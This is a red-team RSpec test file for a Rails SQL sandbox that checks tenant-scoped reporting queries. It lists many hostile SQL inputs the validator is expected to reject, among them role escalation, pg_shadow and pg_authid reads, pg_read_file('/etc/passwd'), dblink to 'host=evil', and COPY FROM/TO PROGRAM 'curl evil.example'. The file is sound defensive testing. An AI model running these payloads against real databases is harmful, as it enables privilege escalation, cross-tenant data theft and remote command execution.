# frozen_string_literal: true

require 'rails_helper'

# Red-team spec for layer 1 of the reporting-SQL sandbox.
#
# Layer 1 is a pre-filter, not the final boundary (that is the `analytics_reader`
# role at execution time). But it carries three security promises the rest of the
# design leans on, and that this spec hammers on from an attacker's seat:
#
#   1. a query can never assume a different Postgres ROLE;
#   2. a query can never reach a schema other than the current tenant schema
#      (nor any cluster-global object outside it);
#   3. a query can never modify data or session state.
#
# Each rejection test asserts the security invariant (rejected + nothing handed
# downstream); where the rejection reason is stable it is matched too, so a future
# change that lets the query through for a *different* reason still fails here. The
# accepted block guards against the sandbox silently tightening into uselessness.
RSpec.describe McpServer::SqlSandboxer do
  def expect_accepted(sql)
    result = described_class.validate(sql)
    expect(result).to be_valid, "expected ACCEPT, got rejection: #{result.error.inspect}\n  query: #{sql}"
    expect(result.error).to be_nil
    expect(result.normalized_sql).to be_present
  end

  def expect_rejected(sql, message = nil)
    result = described_class.validate(sql)
    expect(result).not_to be_valid, "expected REJECT, but it was accepted\n  query: #{sql}"
    # Nothing is ever forwarded to layer 2 for a rejected query.
    expect(result.normalized_sql).to be_nil
    expect(result.error).to match(message) if message
  end

  describe 'accepted: legitimate reporting queries (no over-rejection)' do
    [
      'SELECT count(*) FROM analytics_fact_participations',
      "SELECT date_trunc('month', d.date) AS m, count(*) " \
      'FROM analytics_fact_participations f ' \
      'JOIN analytics_dimension_dates d ON d.id = f.dimension_date_created_id GROUP BY 1',
      'WITH p AS (SELECT * FROM analytics_fact_participations) SELECT count(*) FROM p',
      'SELECT extract(year FROM d.date), count(*)::text, coalesce(f.likes_count, 0) ' \
      'FROM analytics_fact_participations f JOIN analytics_dimension_dates d ON true GROUP BY 1, 2, 3',
      'SELECT dimension_project_id, row_number() OVER (ORDER BY count(*) DESC) ' \
      'FROM analytics_fact_participations GROUP BY 1',
      'SELECT p.name, count(*) FROM analytics_fact_participations f ' \
      'JOIN analytics_dimension_projects p ON p.id = f.dimension_project_id GROUP BY 1',

      # Every exposed reporting table, joined.
      'SELECT count(*) FROM analytics_fact_participations f ' \
      'JOIN analytics_dimension_projects p ON true JOIN analytics_dimension_types t ON true ' \
      'JOIN analytics_dimension_users u ON true JOIN analytics_dimension_dates d ON true',

      # Scoped CTE shapes the scope-aware fix must keep working.
      'WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t WHERE n < 5) SELECT sum(n) FROM t',
      'WITH a AS (WITH b AS (SELECT * FROM analytics_fact_participations) SELECT * FROM b) SELECT count(*) FROM a',
      'WITH a AS (SELECT count(*) AS c FROM analytics_fact_participations), ' \
      'b AS (SELECT count(*) AS c FROM analytics_dimension_users) SELECT a.c, b.c FROM a, b',

      # LATERAL + correlated subquery (scope inherited from the outer query).
      'SELECT f.dimension_project_id FROM analytics_fact_participations f, ' \
      'LATERAL (SELECT count(*) FROM analytics_dimension_dates d WHERE d.id = f.dimension_date_created_id) x',

      # Set operations over allowed tables.
      'SELECT count(*) FROM analytics_fact_participations UNION SELECT count(*) FROM analytics_dimension_users',

      # The pg_catalog exemption exists so explicit pg_catalog qualification of an
      # *allowlisted* function still works.
      'SELECT pg_catalog.count(*) FROM analytics_fact_participations',

      # A CTE may legitimately be named like a catalog as long as it is only ever
      # resolved to that CTE (its body reads an allowed table). The shadowing is
      # safe; only cross-scope name confusion (tested below) is not.
      'WITH pg_user AS (SELECT * FROM analytics_fact_participations) SELECT count(*) FROM pg_user'
    ].each do |sql|
      it("accepts: #{sql[0, 80]}") { expect_accepted(sql) }
    end
  end

  describe 'CONSTRAINT 1: a query can never assume a different Postgres role' do
    {
      'SET ROLE' => ['SET ROLE postgres', /top-level SELECT/],
      'SET SESSION AUTHORIZATION' => ['SET SESSION AUTHORIZATION postgres', /top-level SELECT/],
      'SET LOCAL ROLE' => ['SET LOCAL ROLE postgres', /top-level SELECT/],
      'RESET ROLE' => ['RESET ROLE', /top-level SELECT/],
      'set_config(role) as a value function' =>
        ["SELECT set_config('role', 'postgres', false)", /set_config.*not allowed/],
      # The pg_catalog exemption must bypass only the schema check, never the allowlist.
      'pg_catalog.set_config(role)' =>
        ["SELECT pg_catalog.set_config('role', 'postgres', false)", /set_config.*not allowed/],
      'set_config(role) over a real view' =>
        ["SELECT set_config('role','postgres',false) FROM analytics_fact_participations", /set_config.*not allowed/],
      'set_config(role) hidden in a CTE' =>
        ["WITH x AS (SELECT set_config('role','postgres',false) AS r) SELECT * FROM x", /set_config.*not allowed/],
      'SET_CONFIG uppercased (allowlist is case-insensitive)' =>
        ["SELECT SET_CONFIG('role','postgres',false)", /set_config.*not allowed/],
      'DO block' =>
        ["DO $$ BEGIN PERFORM set_config('role','postgres',false); END $$", /top-level SELECT/],
      'CALL a procedure' => ['CALL some_proc()', /top-level SELECT/],
      'SET ROLE smuggled as a second statement' => ['SET ROLE postgres; SELECT 1', /single statement/],
      'SET ROLE smuggled as a trailing statement' => ['SELECT 1; SET ROLE postgres', /single statement/]
    }.each do |label, (sql, message)|
      it("rejects #{label}") { expect_rejected(sql, message) }
    end
  end

  describe 'CONSTRAINT 2: a query can never reach another schema or tenant' do
    {
      # Schema/catalog qualifier is the one cross-tenant hole layer 2 cannot close.
      'a schema-qualified table' =>
        ['SELECT * FROM victim_city.analytics_fact_participations', /Schema-qualified table/],
      'a catalog-qualified table' =>
        ['SELECT * FROM db.public.analytics_fact_participations', /Schema-qualified table/],
      'schema-qualified inside a derived-table subquery' =>
        ['SELECT * FROM (SELECT * FROM victim.users) x', /Schema-qualified table/],
      'schema-qualified inside a scalar subquery' =>
        ['SELECT (SELECT count(*) FROM victim.users) AS n', /Schema-qualified table/],
      'schema-qualified inside an IN-subquery' =>
        ['SELECT * FROM analytics_fact_participations WHERE dimension_user_id IN (SELECT id FROM victim.users)',
          /Schema-qualified table/],
      'schema-qualified inside a CTE body' =>
        ['WITH x AS (SELECT * FROM victim.users) SELECT * FROM x', /Schema-qualified table/],
      'schema-qualified inside a JOIN' =>
        ['SELECT * FROM analytics_fact_participations f JOIN victim.users u ON u.id = f.dimension_user_id',
          /Schema-qualified table/],
      'schema-qualified inside a UNION branch' =>
        ['SELECT 1 FROM analytics_fact_participations UNION SELECT 1 FROM victim.users', /Schema-qualified table/],
      'schema-qualified inside a LATERAL subquery' =>
        ['SELECT * FROM analytics_fact_participations f, LATERAL (SELECT * FROM victim.users) x',
          /Schema-qualified table/],
      'schema-qualified buried in a CASE expression' =>
        ['SELECT CASE WHEN true THEN (SELECT count(*) FROM victim.users) ELSE 0 END', /Schema-qualified table/],
      'schema-qualified buried in a function argument' =>
        ['SELECT max((SELECT id FROM victim.users)) FROM analytics_fact_participations', /Schema-qualified table/],

      # Plain & analytics_-lookalike tables outside the explicit allowlist.
      'a plain non-whitelisted table' => ['SELECT * FROM users', /not queryable/],
      'an analytics_-looking table not in the allowlist' =>
        ['SELECT * FROM analytics_fact_visits', /not queryable/],
      'a non-whitelisted table inside a JOIN' =>
        ['SELECT * FROM analytics_fact_participations f JOIN users u ON u.id = f.dimension_user_id', /not queryable/],

      # search_path manipulation.
      'search_path change via set_config' =>
        ["SELECT set_config('search_path','public',false) FROM analytics_fact_participations",
          /set_config.*not allowed/],
      'search_path change via SET' => ['SET search_path TO public', /top-level SELECT/],

      # Functions that take a SQL string and run it server-side, escaping the AST.
      'query_to_xml (runs a string query)' =>
        ["SELECT query_to_xml('SELECT * FROM users', true, false, '')", /query_to_xml.*not allowed/],
      'database_to_xml (dumps the whole database)' =>
        ["SELECT database_to_xml(true, false, '')", /database_to_xml.*not allowed/],
      'dblink (out-of-band query)' =>
        ["SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)", /dblink.*not allowed/],

      # Cluster-global catalogs reachable unqualified because pg_catalog is always
      # on search_path; these leak roles/databases/other tenants' activity.
      'unqualified pg_user' => ['SELECT * FROM pg_user', /Table 'pg_user' is not queryable/],
      'unqualified pg_authid' => ['SELECT * FROM pg_authid', /Table 'pg_authid' is not queryable/],
      'unqualified pg_shadow' => ['SELECT * FROM pg_shadow', /Table 'pg_shadow' is not queryable/],
      'unqualified pg_roles' => ['SELECT * FROM pg_roles', /Table 'pg_roles' is not queryable/],
      'unqualified pg_database' => ['SELECT * FROM pg_database', /Table 'pg_database' is not queryable/],
      'unqualified pg_stat_activity' =>
        ['SELECT * FROM pg_stat_activity', /Table 'pg_stat_activity' is not queryable/],
      'pg_catalog-qualified catalog' => ['SELECT * FROM pg_catalog.pg_user', /Schema-qualified table/],
      'information_schema view' => ['SELECT * FROM information_schema.tables', /Schema-qualified table/],

      # Quoting an identifier must not slip a non-allowed relation past the filter.
      'a quoted catalog name' => ['SELECT * FROM "pg_user"', /Table 'pg_user' is not queryable/],

      # The cross-scope CTE-name confusion: a CTE named like a cluster catalog,
      # defined in an inner/sibling scope, must NOT exempt the same-named real
      # relation referenced in an outer scope (regression guard for the leak).
      'CTE-name confusion leaking a same-schema table' =>
        ['SELECT * FROM users WHERE EXISTS (WITH users AS (SELECT 1 AS id) SELECT 1 FROM users)',
          /Table 'users' is not queryable/],
      'CTE-name confusion leaking pg_user (sibling EXISTS scope)' =>
        ['SELECT * FROM pg_user WHERE EXISTS (WITH pg_user AS (SELECT 1 AS id) SELECT 1 FROM pg_user)',
          /Table 'pg_user' is not queryable/],
      'CTE-name confusion leaking pg_database (nested WITH scope)' =>
        ['WITH dummy AS (WITH pg_database AS (SELECT 1 AS id) SELECT id FROM pg_database) SELECT * FROM pg_database',
          /Table 'pg_database' is not queryable/]
    }.each do |label, (sql, message)|
      it("rejects #{label}") { expect_rejected(sql, message) }
    end
  end

  describe 'CONSTRAINT 3: a query can never modify data or session state' do
    {
      # Writable CTEs (the classic "SELECT that writes").
      'INSERT inside a CTE' =>
        ['WITH x AS (INSERT INTO users(id) VALUES (1) RETURNING id) SELECT * FROM x', /Data-modifying/],
      'UPDATE inside a CTE' =>
        ['WITH x AS (UPDATE users SET email = NULL RETURNING id) SELECT * FROM x', /Data-modifying/],
      'DELETE inside a CTE' =>
        ['WITH x AS (DELETE FROM users RETURNING id) SELECT * FROM x', /Data-modifying/],
      'a top-level UPDATE' =>
        ['UPDATE analytics_fact_participations SET dimension_user_id = NULL', /top-level SELECT/],
      'a top-level MERGE' =>
        ['MERGE INTO users u USING analytics_fact_participations f ON u.id = f.dimension_user_id ' \
         'WHEN MATCHED THEN DELETE', /top-level SELECT/],

      # SELECT INTO / CREATE TABLE AS materialise a new relation.
      'SELECT ... INTO' => ['SELECT * INTO foo FROM analytics_fact_participations', /INTO/],
      'SELECT ... INTO TEMP' => ['SELECT * INTO TEMP foo FROM analytics_fact_participations', /INTO/],
      'CREATE TABLE AS SELECT' =>
        ['CREATE TABLE foo AS SELECT * FROM analytics_fact_participations', /top-level SELECT/],

      # Sequence mutation.
      'nextval' => ["SELECT nextval('some_seq')", /nextval.*not allowed/],
      'setval' => ["SELECT setval('some_seq', 1)", /setval.*not allowed/],

      # File / large-object read & write.
      'lo_export (writes a file)' => ["SELECT lo_export(1234, '/tmp/x')", /lo_export.*not allowed/],
      'lo_import (reads a file)' => ["SELECT lo_import('/etc/passwd')", /lo_import.*not allowed/],
      'lo_put (writes a large object)' => ["SELECT lo_put(1234, 0, 'x')", /lo_put.*not allowed/],
      'pg_read_file' => ["SELECT pg_read_file('/etc/passwd')", /pg_read_file.*not allowed/],
      'pg_ls_dir as a FROM-clause function' => ["SELECT * FROM pg_ls_dir('/etc')", /pg_ls_dir.*not allowed/],

      # COPY, including the command-execution variants.
      'COPY ... TO file' => ["COPY analytics_fact_participations TO '/tmp/x'", /top-level SELECT/],
      'COPY ... FROM PROGRAM (RCE)' => ["COPY foo FROM PROGRAM 'curl evil.example'", /top-level SELECT/],
      'COPY ... TO PROGRAM (RCE)' => ["COPY (SELECT 1) TO PROGRAM 'curl evil.example'", /top-level SELECT/],

      # DDL / privilege changes.
      'TRUNCATE' => ['TRUNCATE analytics_fact_participations', /top-level SELECT/],
      'GRANT' => ['GRANT ALL ON analytics_fact_participations TO PUBLIC', /top-level SELECT/],
      'CREATE FUNCTION' =>
        ["CREATE FUNCTION evil() RETURNS int AS 'SELECT 1' LANGUAGE sql", /top-level SELECT/],
      'DROP TABLE' => ['DROP TABLE analytics_fact_participations', /top-level SELECT/],
      'ALTER TABLE' => ['ALTER TABLE analytics_fact_participations ADD COLUMN x int', /top-level SELECT/],
      'REFRESH MATERIALIZED VIEW' =>
        ['REFRESH MATERIALIZED VIEW analytics_fact_participations', /top-level SELECT/],

      # EXPLAIN ANALYZE *executes* its statement, so it must be rejected too.
      'EXPLAIN ANALYZE DELETE (would execute the delete)' =>
        ['EXPLAIN ANALYZE DELETE FROM analytics_fact_participations', /top-level SELECT/],
      'PREPARE' => ['PREPARE p AS SELECT 1', /top-level SELECT/],
      'DECLARE CURSOR' => ['DECLARE c CURSOR FOR SELECT 1', /top-level SELECT/],
      'VACUUM' => ['VACUUM', /top-level SELECT/]
    }.each do |label, (sql, message)|
      it("rejects #{label}") { expect_rejected(sql, message) }
    end
  end

  describe 'function allowlist (defence-in-depth: only pure, listed functions run)' do
    {
      'pg_sleep (resource-exhaustion / DoS)' =>
        ['SELECT pg_sleep(10) FROM analytics_fact_participations', /pg_sleep.*not allowed/],
      'a schema-qualified function call' =>
        ['SELECT public.evil() FROM analytics_fact_participations', /Schema-qualified function/],
      'an arbitrary unknown function' =>
        ['SELECT make_me_a_sandwich() FROM analytics_fact_participations', /make_me_a_sandwich.*not allowed/]
    }.each do |label, (sql, message)|
      it("rejects #{label}") { expect_rejected(sql, message) }
    end
  end

  describe 'parser robustness & normalisation' do
    {
      'multiple statements' => ['SELECT 1; SELECT 2', /single statement/],
      'an empty string' => ['', /single statement/],
      'whitespace only' => ['   ', /single statement/],
      'a comment-only input' => ['-- just a comment', /single statement/],
      'unparseable SQL' => ['SELCT bogus', /Could not parse/]
    }.each do |label, (sql, message)|
      it("rejects #{label}") { expect_rejected(sql, message) }
    end

    it 'accepts a single trailing semicolon and normalises it away' do
      result = described_class.validate('SELECT count(*) FROM analytics_fact_participations;')

      expect(result).to be_valid
      expect(result.normalized_sql).not_to include(';')
    end

    it 'strips comments out of the normalised SQL handed to layer 2' do
      result = described_class.validate(
        'SELECT count(*) /* injected */ FROM analytics_fact_participations -- trailing'
      )

      expect(result).to be_valid
      expect(result.normalized_sql).not_to match(%r{injected|trailing|--|/\*})
    end
  end
end
